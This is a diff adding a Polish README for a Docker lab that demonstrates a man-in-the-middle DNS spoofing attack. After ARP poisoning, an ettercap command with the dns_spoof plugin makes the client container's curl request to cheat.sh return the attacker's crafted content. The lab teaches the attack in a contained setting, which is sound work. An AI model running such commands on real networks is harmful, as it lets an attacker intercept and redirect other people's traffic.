@@ -1,0 +1,60 @@
+
+# Uruchomienie kontenerów
+
+```powershell
+cd man-in-the-middle
+docker-compose up
+```
+
+## Wejście do powłoki kontenera
+
+```powershell
+docker exec -it <attacker/client> [ba]sh
+```
+
+
+>[!TIP] Wyjść z powłoki można wywołując polecenie `exit`.
+
+# Sprawdzenie stanu początkowego
+
+## Atakujący
+
+```bash
+curl 192.168.15.3
+```
+
+Odpowiedzią powinna być treść spreparowanej ściągi polecenia `curl`.
+
+## Klient
+
+```sh
+curl cheat.sh/curl
+```
+
+Odpowiedzią powinna być poprawna ściąga polecenia `curl`.
+
+# Atak DNS spoofing
+
+Wejdź do powłoki klienta i wywołaj polecenie:
+
+```sh
+curl cheat.sh/curl
+```
+
+Powinna pokazać się treść właściwej ściągi.
+
+W osobnej sesji terminala wejdź do powłoki kontenera atakującego i wywołaj polecenie:
+
+```bash
+ettercap -Tq -i eth0 -M arp:remote /192.168.15.4// /192.168.15.1// -P dns_spoof
+```
+
+Nie zatrzymuj tej sesji; proces by się zatrzymał.
+
+Wróć do sesji z powłoką klienta i wywołaj polecenie:
+
+```sh
+curl cheat.sh/curl
+```
+
+Powinna pokazać się złośliwa treść.
